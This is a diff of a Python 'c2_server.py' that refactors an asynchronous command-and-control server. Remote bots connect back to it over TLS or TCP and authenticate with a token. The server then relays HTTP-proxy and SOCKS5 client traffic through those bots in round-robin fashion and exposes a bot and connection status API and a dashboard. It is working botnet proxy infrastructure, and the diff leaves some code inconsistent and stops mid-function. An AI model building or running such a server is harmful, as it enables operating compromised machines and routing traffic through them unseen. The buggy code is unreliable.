@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 """
-C2 Server with improved structure and modular design.
+c2_server.py
+
+Async C2 server:
+- Accept reverse Bot tunnels over TLS/TCP
+- Accept local clients on HTTP proxy (8080) and SOCKS5 (1080)
+- Multiplex traffic using framed protocol
+- Round-robin load balancing across Bots
 """
 
 import asyncio
@@ -20,6 +26,7 @@ from core.utils.logging import setup_logging, get_logger
 from features.monitoring.health_check import HealthChecker
 from features.monitoring.web_dashboard import WebDashboard
 
+
 logger = get_logger("c2")
 
 
@@ -27,74 +34,50 @@ class BotSession:
     def __init__(self, bot_id: str, stream: FramedStream, config: dict):
         self.bot_id = bot_id
         self.stream = stream
-        self.active: Dict[str, dict] = {}  # request_id -> connection info
-        self.heartbeat: Optional[Heartbeat] = None
-        
-        # Setup heartbeat
-        heartbeat_interval = config["heartbeat"]["interval"]
-        heartbeat_timeout = config["heartbeat"]["timeout"]
-        self.heartbeat = Heartbeat(
-            stream, 
-            interval=heartbeat_interval, 
-            timeout=heartbeat_timeout,
-            name=f"bot-{bot_id}"
-        )
+        # Use config values for heartbeat
+        heartbeat_interval = config.get("heartbeat", {}).get("interval", 30)
+        heartbeat_timeout = config.get("heartbeat", {}).get("timeout", 90)
+        self.heartbeat = Heartbeat(stream, interval=heartbeat_interval, timeout=heartbeat_timeout, name=f"bot-{bot_id}")
+        # Map request_id -> (reader, writer) for client connections routed via this bot
+        self.active: Dict[str, asyncio.StreamWriter] = {}
 
     async def start(self):
-        """Start the bot session."""
-        if self.heartbeat:
-            await self.heartbeat.start()
-
-    async def stop(self):
-        """Stop the bot session."""
-        if self.heartbeat:
-            await self.heartbeat.stop()
+        await self.heartbeat.start()
 
 
 class C2Server:
-    def __init__(self, config_file: str = "config/config.json"):
-        # Load configuration
-        self.config = load_config(config_file)
-        if not validate_config(self.config):
-            raise ValueError("Invalid configuration")
-        
-        # Setup logging
-        setup_logging(
-            level=self.config["logging"]["level"],
-            format_string=self.config["logging"]["format"]
-        )
-        
-        # Server settings
+    def __init__(self, config_file: str = "config.json"):
+        self.config = self._load_config(config_file)
         self.host = self.config["server"]["host"]
         self.bot_port = self.config["server"]["bot_port"]
         self.http_port = self.config["server"]["http_port"]
         self.socks_port = self.config["server"]["socks_port"]
         self.api_port = self.config["server"]["api_port"]
-        
-        # Security settings
         self.bot_token = self.config["security"]["bot_token"]
-        self.tls_enabled = self.config["security"]["tls_enabled"]
-        self.certfile = self.config["security"]["certfile"]
-        self.keyfile = self.config["security"]["keyfile"]
+        self.ssl_ctx: Optional[ssl.SSLContext] = None
         
         # Setup TLS if enabled
-        self.ssl_ctx: Optional[ssl.SSLContext] = None
-        if self.tls_enabled:
-            if os.path.exists(self.certfile) and os.path.exists(self.keyfile):
+        if self.config["security"]["tls"]["enabled"]:
+            cert_file = self.config["security"]["tls"]["cert_file"]
+            key_file = self.config["security"]["tls"]["key_file"]
+            if os.path.exists(cert_file) and os.path.exists(key_file):
                 ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                ctx.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
+                ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
                 self.ssl_ctx = ctx
-                logger.info("TLS enabled with cert: %s, key: %s", self.certfile, self.keyfile)
+                logger.info("TLS enabled with cert: %s, key: %s", cert_file, key_file)
             else:
-                logger.warning("TLS enabled but cert/key files not found: %s, %s", self.certfile, self.keyfile)
+                logger.warning("TLS enabled but cert/key files not found: %s, %s", cert_file, key_file)
         
-        # Bot management
+        # Setup logging
+        log_level = getattr(logging, self.config["logging"]["level"].upper(), logging.INFO)
+        logging.basicConfig(level=log_level, format=self.config["logging"]["format"])
+        
         self.bots: Dict[str, BotSession] = {}
-        self.preferred_bot: Optional[str] = None
         self._rr_keys = []
         self._rr_idx = 0
+        self.preferred_bot: Optional[str] = None
         
-        # Network settings
+        # Network settings from config
         self.buffer_size = self.config["network"]["buffer_size"]
         self.read_timeout = self.config["network"]["read_timeout"]
         self.write_timeout = self.config["network"]["write_timeout"]
@@ -114,9 +97,65 @@ class C2Server:
         self._total_connections = 0
         self._connection_counts = {}  # bot_id -> count
         
-        # Initialize features
-        self.health_checker = HealthChecker(self)
-        self.web_dashboard = WebDashboard(self)
+        # Health check tracking
+        self._start_time = time.time()
+        self._last_health_check = time.time()
+        self._health_status = "healthy"
+
+    def _load_config(self, config_file: str) -> dict:
+        """Load configuration from JSON file with fallback to defaults."""
+        default_config = {
+            "server": {
+                "host": "0.0.0.0",
+                "bot_port": 4443,
+                "http_port": 8080,
+                "socks_port": 1080,
+                "api_port": 5001
+            },
+            "security": {
+                "bot_token": "changeme",
+                "tls": {
+                    "enabled": False,
+                    "cert_file": "cert.pem",
+                    "key_file": "key.pem"
+                }
+            },
+            "logging": {
+                "level": "INFO",
+                "format": "[%(asctime)s] %(levelname)s %(name)s: %(message)s"
+            },
+            "limits": {
+                "max_bots": 100,
+                "max_connections_per_bot": 50,
+                "connection_timeout": 300
+            },
+            "heartbeat": {
+                "interval": 30,
+                "timeout": 90
+            },
+            "network": {
+                "buffer_size": 4096,
+                "read_timeout": 30,
+                "write_timeout": 30,
+                "connect_timeout": 10
+            }
+        }
+        
+        try:
+            if os.path.exists(config_file):
+                with open(config_file, 'r', encoding='utf-8') as f:
+                    config = json.load(f)
+                logger.info("Loaded config from %s", config_file)
+                return config
+            else:
+                logger.warning("Config file %s not found, using defaults", config_file)
+                return default_config
+        except (json.JSONDecodeError, KeyError) as e:
+            logger.error("Invalid config file %s: %s, using defaults", config_file, e)
+            return default_config
+        except Exception as e:
+            logger.error("Error loading config %s: %s, using defaults", config_file, e)
+            return default_config
 
     def _next_bot(self) -> Optional[BotSession]:
         if not self.bots:
@@ -167,45 +206,110 @@ class C2Server:
             "bot_connections": dict(self._connection_counts)
         }
 
+    def _get_health_status(self) -> dict:
+        """Get comprehensive health status."""
+        current_time = time.time()
+        uptime = current_time - self._start_time
+        
+        # Check if we have any bots
+        has_bots = len(self.bots) > 0
+        
+        # Check if any bots are overloaded
+        overloaded_bots = 0
+        for bot_id, count in self._connection_counts.items():
+            if count >= self.max_connections_per_bot:
+                overloaded_bots += 1
+        
+        # Determine overall health status
+        if not has_bots:
+            health_status = "degraded"
+            health_message = "No bots connected"
+        elif overloaded_bots > 0:
+            health_status = "warning"
+            health_message = f"{overloaded_bots} bots overloaded"
+        elif len(self.bots) >= self.max_bots * 0.9:  # 90% of max bots
+            health_status = "warning"
+            health_message = "Approaching bot limit"
+        else:
+            health_status = "healthy"
+            health_message = "All systems operational"
+        
+        # Update internal health status
+        self._health_status = health_status
+        self._last_health_check = current_time
+        
+        return {
+            "status": health_status,
+            "message": health_message,
+            "timestamp": current_time,
+            "uptime_seconds": uptime,
+            "uptime_human": self._format_uptime(uptime),
+            "bots": {
+                "total": len(self.bots),
+                "max": self.max_bots,
+                "overloaded": overloaded_bots,
+                "list": list(self.bots.keys())
+            },
+            "connections": {
+                "total": self._total_connections,
+                "max_per_bot": self.max_connections_per_bot,
+                "per_bot": dict(self._connection_counts)
+            },
+            "servers": {
+                "bot_port": self.bot_port,
+                "http_port": self.http_port,
+                "socks_port": self.socks_port,
+                "api_port": self.api_port
+            }
+        }
+
+    def _format_uptime(self, seconds: float) -> str:
+        """Format uptime in human readable format."""
+        days = int(seconds // 86400)
+        hours = int((seconds % 86400) // 3600)
+        minutes = int((seconds % 3600) // 60)
+        secs = int(seconds % 60)
+        
+        if days > 0:
+            return f"{days}d {hours}h {minutes}m {secs}s"
+        elif hours > 0:
+            return f"{hours}h {minutes}m {secs}s"
+        elif minutes > 0:
+            return f"{minutes}m {secs}s"
+        else:
+            return f"{secs}s"
+
     async def serve(self):
         """Start the C2 server with graceful shutdown support."""
         # Setup signal handlers
         self._setup_signal_handlers()
-
+        
         # Start servers
-        bot_server = await asyncio.start_server(
-            self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx
-        )
-        http_server = await asyncio.start_server(
-            self._handle_http_client, self.host, self.http_port
-        )
-        socks_server = await asyncio.start_server(
-            self._handle_socks_client, self.host, self.socks_port
-        )
-        api_server = await asyncio.start_server(
-            self._handle_api_client, self.host, self.api_port
-        )
-
+        bot_server = await asyncio.start_server(self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx)
+        http_server = await asyncio.start_server(self._handle_http_client, self.host, self.http_port)
+        socks_server = await asyncio.start_server(self._handle_socks_client, self.host, self.socks_port)
+        api_server = await asyncio.start_server(self._handle_api_client, self.host, self.api_port)
+        
         self._servers = [bot_server, http_server, socks_server, api_server]
-
-        logger.info("🚀 C2 Server starting...")
-        logger.info("📡 Bot port: %s:%d", self.host, self.bot_port)
-        logger.info("🌐 HTTP proxy: %s:%d", self.host, self.http_port)
-        logger.info("🔌 SOCKS5 proxy: %s:%d", self.host, self.socks_port)
-        logger.info("📊 API/Web UI: %s:%d", self.host, self.api_port)
+        
+        addrs = ", ".join(str(s.getsockname()) for s in bot_server.sockets)
+        logger.info("C2 listening for bots on %s", addrs)
+        logger.info("HTTP proxy on %s:%d", self.host, self.http_port)
+        logger.info("SOCKS5 proxy on %s:%d", self.host, self.socks_port)
+        logger.info("Web API on %s:%d", self.host, self.api_port)
         logger.info("Press Ctrl+C to shutdown gracefully")
-
+        
         try:
-            # Start server tasks
+            # Start all servers
             server_tasks = [
                 asyncio.create_task(server.serve_forever(), name=f"server-{i}")
                 for i, server in enumerate(self._servers)
             ]
             self._tasks.extend(server_tasks)
-
+            
             # Wait for shutdown signal
             await self._shutdown_event.wait()
-
+            
         except KeyboardInterrupt:
             logger.info("Received keyboard interrupt")
         except Exception as e:
@@ -216,12 +320,15 @@ class C2Server:
     def _setup_signal_handlers(self):
         """Setup signal handlers for graceful shutdown."""
         def signal_handler(signum, frame):
-            logger.info("Received signal %d, initiating shutdown...", signum)
+            logger.info("Received signal %d, initiating graceful shutdown...", signum)
             self._shutdown_event.set()
-
+        
+        # Setup signal handlers
         signal.signal(signal.SIGINT, signal_handler)
         signal.signal(signal.SIGTERM, signal_handler)
-        if hasattr(signal, 'SIGBREAK'):  # Windows
+        
+        # On Windows, also handle SIGBREAK
+        if hasattr(signal, 'SIGBREAK'):
             signal.signal(signal.SIGBREAK, signal_handler)
 
     async def _cleanup(self):
@@ -236,12 +343,12 @@ class C2Server:
                     await task
                 except asyncio.CancelledError:
                     pass
-
+        
         # Close all servers
         for server in self._servers:
             server.close()
             await server.wait_closed()
-
+        
         # Close all bot connections
         for bot_id, session in list(self.bots.items()):
             logger.info("Closing bot connection: %s", bot_id)
@@ -251,12 +358,11 @@ class C2Server:
                 session.stream.close()
             except Exception as e:
                 logger.warning("Error closing bot %s: %s", bot_id, e)
-
+        
         self.bots.clear()
         logger.info("Cleanup completed")
 
     async def _handle_bot(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-        """Handle bot connections."""
         peer = writer.get_extra_info("peername")
         stream = FramedStream(reader, writer)
         logger.info("Bot connected from %s", peer)
@@ -293,21 +399,24 @@ class C2Server:
         await session.start()
         await stream.send(Frame(type="OK", meta={"msg": "AUTH_OK"}))
         logger.info("Bot %s authenticated successfully", bot_id)
-
         try:
             while True:
                 frame = await stream.recv()
                 if frame is None:
                     break
-                
-                if frame.type == "DATA":
+                # Heartbeat
+                if await session.heartbeat.handle_rx(frame):
+                    continue
+                if frame.type == "PROXY_RESPONSE" or frame.type == "DATA":
                     req_id = frame.request_id
+                    if not req_id:
+                        continue
                     info = session.active.get(req_id)
-                    if info:
+                    if info and frame.payload:
                         try:
                             w = info.get("writer")
                             if w:
-                                await w.write(frame.payload)
+                                w.write(frame.payload)
                                 await w.drain()
                         except (ConnectionResetError, BrokenPipeError, OSError) as e:
                             logger.warning("client write error: %s", e)
@@ -329,7 +438,6 @@ class C2Server:
                             logger.warning("unexpected client close error: %s", e)
                 else:
                     logger.debug("unhandled bot frame: %s", frame.type)
-
         except (ConnectionResetError, BrokenPipeError, OSError) as e:
             logger.warning("bot session connection error: %s", e)
         except asyncio.CancelledError:
@@ -348,7 +456,6 @@ class C2Server:
             stream.close()
 
     async def _handle_http_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-        """Handle HTTP proxy clients."""
         peer = writer.get_extra_info("peername")
         bot = self._next_bot()
         if not bot:
@@ -367,7 +474,6 @@ class C2Server:
             await writer.drain()
             writer.close()
             return
-
         # Peek request with timeout
         try:
             req = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
@@ -375,33 +481,28 @@ class C2Server:
             logger.warning("HTTP client read timeout from %s", peer)
             writer.close()
             return
-
         if not req:
-            writer.close()
+            writer.close();
             return
-
+        # naive parse
+        first = req.split(b"\r\n", 1)[0]
+        is_connect = first.startswith(b"CONNECT ")
         req_id = str(uuid.uuid4())
-        first = req.split(b"\r\n")[0]
-        
-        if first.startswith(b"CONNECT"):
-            # HTTPS tunnel
-            host_port = first.split(b" ")[1].decode()
-            if ":" in host_port:
-                host, port = host_port.split(":", 1)
-                port = int(port)
-            else:
-                host, port = host_port, 443
+        bot.active[req_id] = writer
+        if is_connect:
+            # CONNECT host:port HTTP/1.1
             try:
-                # Tell client tunnel is established
-                writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
-                await writer.drain()
+                hostport = first.split()[1].decode()
+                host, port = hostport.split(":", 1)
+                port = int(port)
+            except (ValueError, IndexError) as e:
+                logger.warning("invalid host:port format: %s", e)
+                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
             except Exception as e:
                 logger.error("unexpected host parsing error: %s", e)
-                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")
-                await writer.drain()
-                writer.close()
-                return
-        
+                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
+            # Tell client tunnel is established
+            writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n"); await writer.drain()
         # Increment connection count
         if not self._increment_connection_count(bot.bot_id):
             logger.warning("Failed to increment connection count for bot %s", bot.bot_id)
@@ -414,6 +515,25 @@ class C2Server:
         await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
         # Track connection meta
         bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
+        
+        # Handle HTTP over tunnel
+        if first.startswith(b"GET") or first.startswith(b"POST") or first.startswith(b"PUT") or first.startswith(b"DELETE"):
+            # Extract Host header
+            host, port = None, 80
+            for line in req.split(b"\r\n"):
+                if line.lower().startswith(b"host:"):
+                    hp = line.split(b":", 1)[1].strip().decode()
+                    if ":" in hp:
+                        host, port = hp.split(":", 1)
+                        host, port = host.strip(), int(port)
+                    else:
+                        host = hp
+                    break
+            if not host:
+                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
+            await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
+            await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=req))
+            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
 
         # Pipe client->bot
         async def pump_client():
@@ -423,23 +543,18 @@ class C2Server:
                     if not chunk:
                         break
                     await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
-            except (ConnectionResetError, BrokenPipeError, OSError) as e:
-                logger.debug("client->bot pump error: %s", e)
-            except Exception as e:
-                logger.warning("unexpected client->bot pump error: %s", e)
             finally:
                 await bot.stream.send(Frame(type="END", request_id=req_id))
 
         asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")
 
     async def _handle_socks_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-        """Handle SOCKS5 proxy clients."""
+        # Minimal SOCKS5 CONNECT support
         peer = writer.get_extra_info("peername")
         bot = self._next_bot()
         if not bot:
             logger.warning("No available bots for SOCKS request from %s", peer)
-            writer.close()
-            return
+            writer.close(); return
         
         # Check connection limit for the selected bot
         if not self._can_accept_connection(bot.bot_id):
@@ -448,34 +563,23 @@ class C2Server:
                          self.max_connections_per_bot, peer)
             writer.close()
             return
-
-        # SOCKS5 handshake
         data = await reader.readexactly(2)
         nmethods = data[1]
         await reader.readexactly(nmethods)  # methods
-        writer.write(b"\x05\x00")
-        await writer.drain()
-        
-        # SOCKS5 request
+        writer.write(b"\x05\x00"); await writer.drain()
         req = await reader.readexactly(4)
-        if req[1] != 1:  # CONNECT
-            writer.close()
-            return
-        
-        # Parse address
-        if req[3] == 1:  # IPv4
-            host = ".".join(str(b) for b in await reader.readexactly(4))
-        elif req[3] == 3:  # Domain
+        if req[1] != 1:  # not CONNECT
+            writer.close(); return
+        atyp = req[3]
+        if atyp == 1:  # IPv4
+            host = ".".join(map(str, (await reader.readexactly(4))))
+        elif atyp == 3:  # domain
             ln = (await reader.readexactly(1))[0]
             host = (await reader.readexactly(ln)).decode()
         else:
-            writer.close()
-            return
-        
+            writer.close(); return
         port = int.from_bytes(await reader.readexactly(2), "big")
-        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
-        await writer.drain()
-        
+        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"); await writer.drain()
         req_id = str(uuid.uuid4())
         
         # Increment connection count
@@ -487,7 +591,6 @@ class C2Server:
         bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
         await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
 
-        # Pipe client->bot
         async def pump_client():
             try:
                 while True:
@@ -495,55 +598,42 @@ class C2Server:
                     if not chunk:
                         break
                     await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
-            except (ConnectionResetError, BrokenPipeError, OSError) as e:
-                logger.debug("client->bot pump error: %s", e)
-            except Exception as e:
-                logger.warning("unexpected client->bot pump error: %s", e)
             finally:
                 await bot.stream.send(Frame(type="END", request_id=req_id))
 
-        asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")
+        asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")
 
     async def _handle_api_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-        """Handle API and web dashboard clients."""
         peer = writer.get_extra_info("peername")
-        
         try:
-            # Read request with timeout
-            req = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
-            if not req:
+            try:
+                data = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
+            except asyncio.TimeoutError:
+                logger.warning("API client read timeout from %s", peer)
                 writer.close()
                 return
+            if not data:
+                writer.close(); return
+            text = data.decode(errors="ignore")
+            line = text.split("\r\n", 1)[0]
+            parts = line.split()
+            if len(parts) < 2:
+                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
+            method, path = parts[0], parts[1]
 
-            # Parse HTTP request
-            lines = req.split(b"\r\n")
-            if not lines:
-                writer.close()
-                return
-
-            first_line = lines[0].decode()
-            parts = first_line.split()
-            if len(parts) < 3:
-                writer.close()
-                return
-
-            method, path, version = parts[0], parts[1], parts[2]
-
-            # Helper function for JSON responses
-            def json_response(data, status="200 OK"):
-                body = json.dumps(data, indent=2).encode()
+            def json_response(obj: dict, status: str = "200 OK"):
+                import json
+                body = json.dumps(obj, default=str).encode()
                 hdr = (
                     f"HTTP/1.1 {status}\r\n"
                     f"Content-Type: application/json\r\n"
                     f"Content-Length: {len(body)}\r\n"
                     f"Access-Control-Allow-Origin: *\r\n\r\n"
                 ).encode()
-                return hdr + body
+                writer.write(hdr + body)
 
-            # API endpoints
             if method == "GET" and path == "/api/status":
                 stats = self._get_connection_stats()
-                health = self.health_checker.get_health_status()
                 resp = {
                     "host": self.host,
                     "ports": {"bot": self.bot_port, "http": self.http_port, "socks": self.socks_port, "api": self.api_port},
@@ -556,165 +646,176 @@ class C2Server:
                         "max_connections_per_bot": stats["max_connections_per_bot"],
                         "current_bots": stats["current_bots"]
                     },
-                    "bot_connections": stats["bot_connections"],
-                    "health": health
+                    "bot_connections": stats["bot_connections"]
                 }
-                writer.write(json_response(resp))
+                json_response(resp)
             elif method == "GET" and path == "/api/bots":
                 bots = []
                 for bid, sess in self.bots.items():
                     bots.append({
                         "bot_id": bid,
                         "active_requests": len(sess.active),
-                        "heartbeat_status": "active" if sess.heartbeat else "inactive"
                     })
-                writer.write(json_response({"bots": bots}))
+                json_response({"bots": bots})
             elif method == "GET" and path == "/api/connections":
-                connections = []
+                conns = []
                 for bid, sess in self.bots.items():
-                    for req_id, info in sess.active.items():
-                        connections.append({
-                            "request_id": req_id,
+                    for rid, info in sess.active.items():
+                        conns.append({
+                            "request_id": rid,
                             "bot_id": bid,
-                            "target": f"{info['host']}:{info['port']}",
-                            "client": str(info['client'])
+                            "target": f"{info.get('host')}:{info.get('port')}",
+                            "client": info.get('client'),
                         })
-                writer.write(json_response({"connections": connections}))
+                json_response({"connections": conns})
             elif method == "POST" and path == "/api/select_bot":
-                # Parse JSON body
-                body = b""
-                for line in lines[1:]:
-                    if line == b"":
-                        break
-                    if line.startswith(b"Content-Length:"):
-                        length = int(line.split(b":")[1].strip())
-                        body = await reader.read(length)
-                        break
-                
+                # very simple body parse
+                body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
+                import json
                 try:
-                    data = json.loads(body.decode())
-                    bid = data.get("bot_id")
-                    if bid and bid in self.bots:
-                        self.preferred_bot = bid
-                        writer.write(json_response({"ok": True, "preferred_bot": bid}))
-                    else:
-                        writer.write(json_response({"ok": False, "error": "invalid_bot"}, status="400 Bad Request"))
-                except json.JSONDecodeError:
-                    writer.write(json_response({"ok": False, "error": "invalid_json"}, status="400 Bad Request"))
+                    payload = json.loads(body or "{}")
+                    bid = payload.get("bot_id")
+                except (json.JSONDecodeError, UnicodeDecodeError) as e:
+                    logger.warning("invalid JSON in request body: %s", e)
+                    bid = None
+                except Exception as e:
+                    logger.error("unexpected JSON parsing error: %s", e)
+                    bid = None
+                if bid and bid in self.bots:
+                    self.preferred_bot = bid
+                    json_response({"ok": True, "preferred_bot": bid})
+                else:
+                    json_response({"ok": False, "error": "invalid_bot"}, status="400 Bad Request")
             elif method == "POST" and path == "/api/clear_preferred_bot":
                 self.preferred_bot = None
-                writer.write(json_response({"ok": True}))
+                json_response({"ok": True})
             elif method == "GET" and path == "/health":
                 # Simple health check endpoint
-                health = self.health_checker.get_health_status()
+                health = self._get_health_status()
                 if health["status"] == "healthy":
-                    writer.write(json_response(health, status="200 OK"))
+                    json_response(health, status="200 OK")
                 elif health["status"] == "warning":
-                    writer.write(json_response(health, status="200 OK"))
+                    json_response(health, status="200 OK")
                 else:  # degraded
-                    writer.write(json_response(health, status="503 Service Unavailable"))
+                    json_response(health, status="503 Service Unavailable")
             elif method == "GET" and path == "/health/detailed":
                 # Detailed health check endpoint
-                health = self.health_checker.get_health_status()
-                writer.write(json_response(health, status="200 OK"))
+                health = self._get_health_status()
+                json_response(health, status="200 OK")
             elif method == "GET" and path == "/health/ready":
                 # Kubernetes readiness probe
                 if len(self.bots) > 0:
-                    writer.write(json_response({"status": "ready", "bots": len(self.bots)}, status="200 OK"))
+                    json_response({"status": "ready", "bots": len(self.bots)}, status="200 OK")
                 else:
-                    writer.write(json_response({"status": "not_ready", "bots": 0}, status="503 Service Unavailable"))
+                    json_response({"status": "not_ready", "bots": 0}, status="503 Service Unavailable")
             elif method == "GET" and path == "/health/live":
                 # Kubernetes liveness probe
-                writer.write(json_response({"status": "alive", "uptime": time.time() - self.health_checker._start_time}, status="200 OK"))
+                json_response({"status": "alive", "uptime": time.time() - self._start_time}, status="200 OK")
             else:
-                # Serve web dashboard
+                # static files
                 if path == "/" or path == "/index.html":
-                    html = self.web_dashboard.get_dashboard_html()
-                    body = html.encode()
-                    hdr = (
-                        f"HTTP/1.1 200 OK\r\n"
-                        f"Content-Type: text/html\r\n"
-                        f"Content-Length: {len(body)}\r\n\r\n"
-                    ).encode()
-                    writer.write(hdr + body)
-                elif path == "/static/dashboard.js":
-                    js = self.web_dashboard.get_dashboard_js()
-                    body = js.encode()
-                    hdr = (
-                        f"HTTP/1.1 200 OK\r\n"
-                        f"Content-Type: application/javascript\r\n"
-                        f"Content-Length: {len(body)}\r\n\r\n"
-                    ).encode()
-                    writer.write(hdr + body)
+                    # Serve dashboard.html
+                    try:
+                        with open("templates/dashboard.html", "r", encoding="utf-8") as f:
+                            body = f.read().encode()
+                        hdr = (
+                            f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {len(body)}\r\n\r\n"
+                        ).encode()
+                        writer.write(hdr + body)
+                    except FileNotFoundError:
+                        writer.write(b"HTTP/1.1 404 Not Found\r\n\r\nDashboard template not found")
+                elif path.startswith("/static/"):
+                    # Serve static files (JS, CSS, etc.)
+                    file_path = path[1:]  # Remove leading /
+                    try:
+                        with open(file_path, "rb") as f:
+                            body = f.read()
+                        content_type = "application/javascript" if file_path.endswith(".js") else "text/css"
+                        hdr = (
+                            f"HTTP/1.1 200 OK\r\nContent-Type: {content_type}\r\nContent-Length: {len(body)}\r\n\r\n"
+                        ).encode()
+                        writer.write(hdr + body)
+                    except FileNotFoundError:
+                        writer.write(b"HTTP/1.1 404 Not Found\r\n\r\nStatic file not found")
                 else:
-                    # 404 Not Found
-                    body = b"404 Not Found"
-                    hdr = (
-                        f"HTTP/1.1 404 Not Found\r\n"
-                        f"Content-Type: text/plain\r\n"
-                        f"Content-Length: {len(body)}\r\n\r\n"
-                    ).encode()
-                    writer.write(hdr + body)
-
-        except asyncio.TimeoutError:
-            logger.warning("API client read timeout from %s", peer)
-        except (ConnectionResetError, BrokenPipeError, OSError) as e:
-            logger.debug("API client connection error: %s", e)
+                    writer.write(b"HTTP/1.1 404 Not Found\r\n\r\n")
         except Exception as e:
-            logger.error("unexpected API client error: %s", e)
+            try:
+                writer.write(b"HTTP/1.1 500 Internal Server Error\r\n\r\n")
+            except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                logger.debug("error response write failed: %s", e)
+            except Exception as e:
+                logger.warning("unexpected error response write error: %s", e)
+            logger.warning("api error: %s", e)
         finally:
-            writer.close()
+            try:
+                await writer.drain()
+            except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                logger.debug("error response drain failed: %s", e)
+            except Exception as e:
+                logger.warning("unexpected error response drain error: %s", e)
+            try:
+                writer.close()
+            except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                logger.debug("error response close failed: %s", e)
+            except Exception as e:
+                logger.warning("unexpected error response close error: %s", e)
 
 
 async def main():
-    """Main entry point for C2 server."""
     import argparse
+    p = argparse.ArgumentParser(description="C2 Server with config file support")
+    p.add_argument("--config", default="config.json", help="Config file path (default: config.json)")
+    p.add_argument("--host", help="Override server host")
+    p.add_argument("--bot-port", type=int, help="Override bot port")
+    p.add_argument("--http-port", type=int, help="Override HTTP proxy port")
+    p.add_argument("--socks-port", type=int, help="Override SOCKS5 proxy port")
+    p.add_argument("--api-port", type=int, help="Override API port")
+    p.add_argument("--bot-token", help="Override bot token")
+    p.add_argument("--tls-enabled", action="store_true", help="Enable TLS")
+    p.add_argument("--certfile", help="TLS certificate file")
+    p.add_argument("--keyfile", help="TLS private key file")
+    args = p.parse_args()
+
+    # Load server with config file
+    server = C2Server(args.config)
     
-    parser = argparse.ArgumentParser(description="C2 Server with improved structure")
-    parser.add_argument("--config", default="config/config.json", help="Config file path")
-    parser.add_argument("--host", help="Override host")
-    parser.add_argument("--bot-port", type=int, help="Override bot port")
-    parser.add_argument("--http-port", type=int, help="Override HTTP port")
-    parser.add_argument("--socks-port", type=int, help="Override SOCKS port")
-    parser.add_argument("--api-port", type=int, help="Override API port")
-    parser.add_argument("--bot-token", help="Override bot token")
-    parser.add_argument("--tls-enabled", action="store_true", help="Enable TLS")
-    parser.add_argument("--certfile", help="TLS certificate file")
-    parser.add_argument("--keyfile", help="TLS key file")
+    # Override with command line arguments if provided
+    if args.host:
+        server.host = args.host
+    if args.bot_port:
+        server.bot_port = args.bot_port
+    if args.http_port:
+        server.http_port = args.http_port
+    if args.socks_port:
+        server.socks_port = args.socks_port
+    if args.api_port:
+        server.api_port = args.api_port
+    if args.bot_token:
+        server.bot_token = args.bot_token
+    if args.tls_enabled:
+        server.config["security"]["tls"]["enabled"] = True
+    if args.certfile:
+        server.config["security"]["tls"]["cert_file"] = args.certfile
+    if args.keyfile:
+        server.config["security"]["tls"]["key_file"] = args.keyfile
     
-    args = parser.parse_args()
+    # Re-setup TLS if overridden
+    if server.config["security"]["tls"]["enabled"]:
+        cert_file = server.config["security"]["tls"]["cert_file"]
+        key_file = server.config["security"]["tls"]["key_file"]
+        if os.path.exists(cert_file) and os.path.exists(key_file):
+            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
+            server.ssl_ctx = ctx
+            logger.info("TLS enabled with cert: %s, key: %s", cert_file, key_file)
+        else:
+            logger.warning("TLS enabled but cert/key files not found: %s, %s", cert_file, key_file)
     
-    try:
-        server = C2Server(args.config)
-        
-        # Apply command line overrides
-        if args.host:
-            server.host = args.host
-        if args.bot_port:
-            server.bot_port = args.bot_port
-        if args.http_port:
-            server.http_port = args.http_port
-        if args.socks_port:
-            server.socks_port = args.socks_port
-        if args.api_port:
-            server.api_port = args.api_port
-        if args.bot_token:
-            server.bot_token = args.bot_token
-        if args.tls_enabled:
-            server.tls_enabled = True
-        if args.certfile:
-            server.certfile = args.certfile
-        if args.keyfile:
-            server.keyfile = args.keyfile
-        
-        await server.serve()
-        
-    except KeyboardInterrupt:
-        logger.info("Shutdown requested by user")
-    except Exception as e:
